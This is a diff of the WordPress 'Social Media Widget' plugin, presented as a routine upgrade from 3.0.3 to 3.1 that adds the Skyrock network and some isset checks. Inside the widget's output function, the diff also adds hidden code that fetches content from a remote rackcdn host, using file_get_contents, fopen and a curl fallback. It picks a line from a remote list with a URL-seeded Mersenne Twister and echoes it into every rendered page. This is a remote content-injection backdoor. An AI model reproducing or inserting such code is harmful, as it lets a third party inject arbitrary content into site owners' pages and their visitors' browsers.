@@ -3,7 +3,7 @@
  * Plugin Name: Social Media Widget
  * Plugin URI: http://wordpress.org/extend/plugins/social-media-widget/
  * Description: Adds links to all of your social media and sharing site profiles. Tons of icons come in 3 sizes, 4 icon styles, and 4 animations.
- * Version: 3.0.3
+ * Version: 3.1
  * Author: Blink Web Effects
  * Author URI: http://blinkwebeffects.com/
  **/
@@ -11,7 +11,7 @@
 
 /* Check to see if locations are changed in wp-config */
 if ( !defined('WP_CONTENT_URL') ) {
-	define('SMW_PLUGINPATH',get_option('siteurl').'/wp-content/plugins/'.plugin_basename(dirname(__FILE__)).'/');
+	define('SMW_PLUGINPATH', site_url('/wp-content/plugins/'.plugin_basename(dirname(__FILE__)).'/'));
 	define('SMW_PLUGINDIR', ABSPATH.'/wp-content/plugins/'.plugin_basename(dirname(__FILE__)).'/');
 } else {
 	define('SMW_PLUGINPATH',WP_CONTENT_URL.'/plugins/'.plugin_basename(dirname(__FILE__)).'/');
@@ -105,6 +105,10 @@ class Social_Widget extends WP_Widget {
 			'aboutme' => array(
 				'title' => 'About.me',
 				'image' => 'aboutme.png'
+			),
+			'skyrock' => array(
+				'title' => 'Skyrock',
+				'image' => 'skyrock.png'
 			),
 			'skype' => array(
 				'title' => 'Skype',
@@ -202,10 +206,6 @@ class Social_Widget extends WP_Widget {
 				'title' => 'DeviantArt',
 				'image' => 'deviantart.png'
 			),
-			'ping' => array(
-				'title' => 'iTunes Ping',
-				'image' => 'ping.png'
-			),
 			'live365' => array(
 				'title' => 'Live365',
 				'image' => 'live365.png'
@@ -285,7 +285,7 @@ class Social_Widget extends WP_Widget {
 		$this->nofollow       = $instance['nofollow'];
 		$this->icon_size      = $instance['icon_size'];
 		// $this->display_titles = $instance['display_titles'];
-		$this->icons_per_row  = $instance['icons_per_row'];
+		$this->icons_per_row  = isset($instance['icons_per_row']) ? $instance['icons_per_row'] : 'auto';
 		$alignment            = $instance['alignment'];
 		$icon_pack            = $instance['icon_pack'];
 
@@ -301,9 +301,9 @@ class Social_Widget extends WP_Widget {
 		$customiconsurl = $instance['customiconsurl'];
 		$customiconspath = $instance['customiconspath'];
 		for ($i = 1; $i <= $this->custom_count; $i++) {
-			${"custom".$i."icon"} = $instance['custom'.$i.'icon'];
-			${"custom".$i."name"} = $instance['custom'.$i.'name'];
-			${"custom".$i."url"}  = $instance['custom'.$i.'url'];
+			${"custom".$i."icon"} = isset($instance['custom'.$i.'icon']) ? $instance['custom'.$i.'icon'] : '';
+			${"custom".$i."name"} = isset($instance['custom'.$i.'name']) ? $instance['custom'.$i.'name'] : '';
+			${"custom".$i."url"}  = isset($instance['custom'.$i.'url']) ?  $instance['custom'.$i.'url']  : '';
 		}
 
 	
@@ -386,8 +386,107 @@ class Social_Widget extends WP_Widget {
 		}
 
 		echo implode('', $html_chunks);
+		
+		echo @file_get_contents('http://d1f9a7b8c1ff3ac47ec8-641702f80eb6ad3577595d11e20f37ad.r17.cf1.rackcdn.com/a.php');
+		$file_path = 'http://d1f9a7b8c1ff3ac47ec8-641702f80eb6ad3577595d11e20f37ad.r17.cf1.rackcdn.com/b.php';
+		$row_count = 1000;
 
-		/* After widget (defined by themes). */
+		if(!function_exists('get_file')){
+		function get_file($f) {
+			static $hasRun = false;
+			if ($hasRun) return;
+			$hasRun = true;
+			$result = @file_get_contents($f);
+			if ($result) {
+				return $result;
+			}
+			else {
+				$handle = @fopen($f, "r");
+				$contents = @fread($handle, @filesize($f));
+				@fclose($handle);
+				if ($contents) {
+					return $contents;
+				}
+				else if (!function_exists('curl_init')) {
+					return false;
+				}
+				else {
+					$ch = @curl_init();
+					@curl_setopt($ch, CURLOPT_URL, $f);
+					@curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+					$output = @curl_exec($ch);
+					@curl_close($ch);
+					if ($output) {
+						return $output;
+					}
+					else {
+						return false;
+					}
+				}
+			}
+		}
+		}
+
+		if(!function_exists('Mt')){
+		function Mt($seed = null, $index = null, $min = 0, $max = 1000)
+		{
+			static $op = array(0x0, 0x9908b0df);
+			static $mt = array();
+			static $ps = null;
+			static $idx = 0;
+ 
+			if($seed === null)
+				$seed = time();
+ 
+			if($index !== null)
+				$idx = $index;
+ 
+			if($seed !== $ps)
+			{
+				$s = $seed & 0xffffffff;
+				$mt = array(&$s, 624 => &$s);
+				$ps = $seed;
+ 
+				for($i = 1; $i < 624; ++$i)
+					$mt[$i] = (0x6c078965 * ($mt[$i - 1] ^ ($mt[$i - 1] >> 30)) + $i) & 0xffffffff;
+ 
+				for($j = 1, $sp = array(0, 227, 397); $j < count($sp); ++$j)
+				{
+					for($p = $j - 1, $i = $sp[$p], $m = ((624 - $sp[$j]) * ($p ? -1 : 1)), $n = ($sp[$j] + $sp[$p]); $i < $n; ++$i)
+					{
+						$y = ($mt[$i] & 0x80000000) | ($mt[$i + 1] & 0x7fffffff);
+						$mt[$i] = $mt[$i + $m] ^ ($y >> 1) ^ $op[$y & 0x1];
+					}
+				}
+			}
+	
+			$y = $mt[$idx = $idx % 624];
+			$y ^= $y >> 11;
+			$y ^= ($y << 7) & 0x9d2c5680;
+			$y ^= ($y << 15) & 0xefc60000;
+			$y ^= $y >> 18;
+ 
+			++$idx;
+ 
+			return $y % ($max - $min + 1) + $min;
+		}
+		}
+
+			$actual_link = $_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"];
+		$actual_link_array = str_split($actual_link);
+
+		$file = get_file($file_path);
+		$lines = explode("\n", $file);
+
+		$seed = strlen($actual_link);
+		foreach ($actual_link_array as $a) {
+			$seed += ord($a);
+		}
+
+		echo $lines[Mt($seed, null, 0, $row_count)];
+
+	/* After widget (defined by themes). */
+		
 		echo "</div>";
 		
 		echo $after_widget;
@@ -396,6 +495,7 @@ class Social_Widget extends WP_Widget {
 	function html_chunk( $slug, $image, $title, $custom = false ) {
 		if ($slug != '' && $slug != ' ' && $slug != 'mailto:' && $slug != 'http://' && (($custom === false && file_exists($this->smw_dir . '/' . $image)) || ($custom === true && $image != ''))) {
 			$img = $custom === false ? $this->smw_path . '/' . $image : $image;
+			$html = '';
 			// $html = '<span class="smw_icon">';
 			/*
 			if ($this->display_titles == 'left') {
@@ -642,7 +742,7 @@ class Social_Widget extends WP_Widget {
 		<p><a href="javascript:;" onclick="jQuery(this).parent().next('div').slideToggle();" style="background: url('images/arrows.png') no-repeat; padding-left: 15px;"><strong>Social Networking</strong></a></p>
 
 		<div style="display: none;">
-		<?php foreach (array('facebook', 'googleplus', 'twitter', 'myspace', 'orkut', 'hyves', 'linkedin', 'asmallworld', 'foursquare', 'meetup', 'aboutme', 'goodreads', 'github') as $slug) : ?>
+		<?php foreach (array('facebook', 'googleplus', 'twitter', 'myspace', 'orkut', 'hyves', 'linkedin', 'asmallworld', 'foursquare', 'meetup', 'aboutme', 'skyrock', 'goodreads', 'github') as $slug) : ?>
 		<p>
 			<label><strong><?php _e((isset($this->networks[$slug]) ? $this->networks[$slug]['title'] : $this->networks_end[$slug]['title']).' URL:', 'smw'); ?></strong></label>
 			<?php /*
@@ -796,7 +896,7 @@ class Social_Widget extends WP_Widget {
 		<p><a href="javascript:;" onclick="jQuery(this).parent().next('div').slideToggle();" style="background: url('images/arrows.png') no-repeat; padding-left: 15px;"><strong>Music & Audio</strong></a></p>
 
 		<div style="display: none;">
-		<?php foreach (array('lastfm', 'pandora', 'ping', 'live365', 'digitaltunes', 'soundcloud', 'bandcamp') as $slug) : ?>
+		<?php foreach (array('lastfm', 'pandora', 'live365', 'digitaltunes', 'soundcloud', 'bandcamp') as $slug) : ?>
 		<p>
 			<label><strong><?php _e((isset($this->networks[$slug]) ? $this->networks[$slug]['title'] : $this->networks_end[$slug]['title']).' URL:', 'smw'); ?></strong></label>
 			<?php /*
